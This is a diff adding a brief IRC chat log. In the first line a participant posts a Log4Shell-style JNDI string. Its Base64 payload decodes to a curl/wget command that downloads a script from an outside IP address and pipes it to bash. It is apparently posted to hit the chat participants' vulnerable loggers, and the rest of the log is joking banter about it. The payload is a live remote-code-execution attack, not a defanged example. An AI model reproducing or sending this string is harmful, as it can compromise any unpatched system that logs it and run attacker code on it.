@@ -1,0 +1,9 @@
+<jewbird> ${JNDI:MENTALUNIX://mentalunixmalware.org:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xMDMuMjExLjExOS4xMDA6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzEwMy4yMTEuMTE5LjEwMDo0NDMpfGJhc2g=}
+<Maestro> plebtastic
+<jewbird> just checking if ur mental unix is patched
+<chzz> java bowels
+<Knio> BEEP BEEP
+<chzz> splat splat
+<Knio> root#
+<jewbird> Knio shutdown now -h
+* Knio has quit (Quit: WeeChat 2.3)
